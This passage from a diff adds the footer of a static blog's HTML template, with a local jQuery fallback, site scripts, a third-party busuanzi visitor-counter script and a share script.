+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
